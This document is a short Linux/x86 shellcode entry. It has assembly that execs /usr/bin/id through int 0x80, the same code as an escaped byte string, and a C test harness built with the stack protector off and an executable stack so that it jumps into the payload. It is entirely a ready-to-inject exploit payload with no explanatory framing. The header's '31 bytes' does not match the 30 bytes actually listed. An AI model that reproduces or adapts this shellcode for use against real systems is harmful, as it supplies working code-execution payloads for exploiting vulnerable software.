; Linux/x86 /usr/bin/id - 31 bytes
; zxp


; //id -- 0x64692f2f
; /bin -- 0x6e69622f
; /usr -- 0x7273752f

00000000  31C0              xor eax,eax
00000002  50                push eax
00000003  682F2F6964        push dword 0x64692f2f
00000008  682F62696E        push dword 0x6e69622f
0000000D  682F757372        push dword 0x7273752f
00000012  89E3              mov ebx,esp
00000014  50                push eax
00000015  89E2              mov edx,esp
00000017  53                push ebx
00000018  89E1              mov ecx,esp
0000001A  B00B              mov al,0xb
0000001C  CD80              int 0x80


==============================================================
gcc shellcode.c -o shellcode -z execstack -fno-stack-protector
==============================================================

#include <stdio.h>

const char code[] = "\x31\xc0\x50\x68\x2f\x2f\x69\x64\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
	(*(void(*)()) code)();
}
